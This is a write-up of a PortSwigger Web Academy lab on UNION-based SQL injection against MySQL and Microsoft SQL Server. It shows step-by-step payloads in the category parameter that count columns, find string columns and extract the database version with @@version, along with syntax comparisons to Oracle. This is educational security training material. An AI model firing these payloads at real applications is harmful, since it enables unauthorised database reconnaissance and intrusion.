# SQL Injection — Querying Database Version on MySQL and Microsoft

**Platform:** PortSwigger Web Academy  
**Category:** SQL Injection — Examining the Database  
**Difficulty:** Practitioner  
**Lab URL:** https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft  

---

## Objective

Use a UNION-based SQL injection attack to retrieve the database version string from a MySQL or Microsoft SQL Server database.

---

## Background

This lab covers the same UNION attack concept as the Oracle version lab, but MySQL and Microsoft SQL Server use different syntax — particularly for comments and version functions.

### Syntax Differences: Oracle vs MySQL/Microsoft

| Feature | Oracle | MySQL | Microsoft SQL Server |
|---|---|---|---|
| Version function | `v$version` view | `@@version` | `@@version` |
| Comment syntax | `--` | `-- ` (space after) or `#` | `--` |
| Dummy table | `FROM dual` | `FROM` optional | `FROM` optional |
| String concat | `\|\|` | `CONCAT()` or space | `+` |

The critical detail for MySQL: the `--` comment requires a **space after it** (`-- `), otherwise MySQL doesn't treat it as a comment. The `#` character is a safer single-line comment for MySQL.

---

## Steps

### 1. Confirm the injection point

Normal request:

```
GET /filter?category=Gifts
```

Test for injection:

```
GET /filter?category=Gifts'
```

A database error confirms the parameter is injectable.

---

### 2. Determine column count

Use ORDER BY to count columns:

```
GET /filter?category=Gifts' ORDER BY 1-- -
GET /filter?category=Gifts' ORDER BY 2-- -
GET /filter?category=Gifts' ORDER BY 3-- -   ← error here = 2 columns
```

Note the `-- -` comment style used here. The trailing space after `--` is required for MySQL. Using `-- -` (dash space dash) is a common convention that ensures the space is present and not stripped by URL handling.

Alternatively with `#`:

```
GET /filter?category=Gifts' ORDER BY 2#
```

When `ORDER BY 3` errors, the query returns **2 columns**.

---

### 3. Confirm UNION and find string columns

```
GET /filter?category=Gifts' UNION SELECT NULL,NULL-- -
```

No error means 2 columns confirmed. Now check which columns are strings:

```
GET /filter?category=Gifts' UNION SELECT 'test',NULL-- -
GET /filter?category=Gifts' UNION SELECT NULL,'test'-- -
```

Whichever renders `test` on the page is your usable string column.

---

### 4. Extract the version

In MySQL and Microsoft SQL Server, the version is available via the `@@version` global variable:

```
GET /filter?category=Gifts' UNION SELECT @@version,NULL-- -
```

The page renders the version string, for example:

**MySQL:**
```
8.0.32-0ubuntu0.20.04.2
```

**Microsoft SQL Server:**
```
Microsoft SQL Server 2019 (RTM-CU18) (KB5017593) - 15.0.4261.1 (X64)
Sep 12 2022 15:07:55
Copyright (C) 2019 Microsoft Corporation
Developer Edition (64-bit) on Linux (Ubuntu 20.04.5 LTS)
```

The lab is solved once the version string appears.

---

## Full Payload Summary

```sql
-- Step 1: Confirm injectable
Gifts'

-- Step 2: Count columns
Gifts' ORDER BY 2-- -

-- Step 3: Confirm UNION
Gifts' UNION SELECT NULL,NULL-- -

-- Step 4: Extract version
Gifts' UNION SELECT @@version,NULL-- -
```

---

## Why This Works

The original query:

```sql
SELECT name, description FROM products WHERE category = '<input>' AND released = 1
```

After injection:

```sql
SELECT name, description FROM products WHERE category = 'Gifts'
UNION
SELECT @@version, NULL-- -' AND released = 1
```

`@@version` is a built-in system variable in both MySQL and SQL Server. It requires no table reference and no special permissions. The UNION appends it as a second row in the result set, and the application renders it alongside product data.

---

## Oracle vs MySQL/Microsoft — Side by Side

| Step | Oracle Payload | MySQL/Microsoft Payload |
|---|---|---|
| Count columns | `ORDER BY 2--` | `ORDER BY 2-- -` |
| UNION test | `UNION SELECT NULL,NULL FROM dual--` | `UNION SELECT NULL,NULL-- -` |
| Get version | `UNION SELECT banner,NULL FROM v$version--` | `UNION SELECT @@version,NULL-- -` |

The logic is identical — only the syntax changes per database engine. Recognizing which engine you're dealing with (from error messages, response headers, or behavior) tells you which syntax to use.

---

## Key Takeaway

> **The same UNION injection logic works across database engines — only the syntax changes.** Knowing the MySQL/MSSQL comment quirk (`-- ` needs a trailing space) is the kind of detail that separates someone who understands the technique from someone just copying payloads. Always adapt syntax to the target engine.

---

## References

- [PortSwigger SQL injection — examining the database](https://portswigger.net/web-security/sql-injection/examining-the-database)
- [PortSwigger SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [MySQL @@version documentation](https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html)
